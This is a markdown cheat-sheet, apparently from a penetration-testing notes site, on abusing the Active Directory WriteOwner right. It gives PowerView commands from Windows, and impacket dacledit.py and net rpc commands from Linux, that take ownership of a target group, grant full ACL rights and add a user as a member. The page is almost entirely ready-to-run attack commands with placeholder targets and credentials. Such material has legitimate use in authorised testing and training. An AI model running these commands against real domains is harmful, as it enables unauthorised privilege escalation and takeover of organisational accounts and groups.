---
title: "WriteOwner/Own"
date: 2024-7-27
tags: ["WriteOwner", "active driectory", "ad", "Windows", "own"]
---

---
### Abuse #1 : Change owner of the group (From Windows)

#### 1. Import PowerView.ps1 

```powershell
. .\PowerView.ps1
```

#### 2. Change owner

```powershell
Set-DomainObjectOwner -Identity <TARGET_GROUP> -OwnerIdentity <USER>
```

### Abuse #2 : Add user to the group (From Windows)

#### 1. Import PowerView.ps1 

```powershell
. .\PowerView.ps1
```

#### 2. Create cred object (runas) \[optional\]

```powershell
$username = "<DOMAIN>\<USER>"
```

```powershell
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
```

```powershell
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Add user to group

```powershell
Add-DomainObjectAcl -TargetIdentity <TARGET_GROUP> -PrincipalIdentity '<DOMAIN>/<USER>' -Rights All -DomainController <DC> -Credential $cred
```

```powershell
Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USER> -Credential $cred
```

#### Check

```powershell
Get-DomainGroupMember -Identity <TARGET_GROUP> -Domain <DOMAIN> -DomainController <DC> -Credential $cred | fl MemberName
```

```powershell
# Or
net user <USER>
```

```powershell
# Exit current sessions or re-login
whoami /groups
```

### Abuse #2 : Add user to the group (From Linux)

#### 0. Install latest impacket (included dacledit.py)

```bash
git clone https://github.com/fortra/impacket.git
```

```bash
cd impacket
```

```bash
pip3 install .
```

#### 1. Add domain object

```bash
sudo ntpdate -s <DC> && dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target <TARGET_GROUP> -action write -rights WriteMembers
```

#### 2. Add group member

```bash
kinit <USER>
```

```bash
sudo ntpdate -s <DC> && net rpc group addmem <TARGET_GROUP> <USER> -U <USER> --use-kerberos=required -S <DC> --no-pass
```

#### 3. Check

```bash
sudo ntpdate -s <DC> && net rpc group members <TARGET_GROUP> -U <USER> --use-kerberos=required -S <DC> --no-pass
```

<br>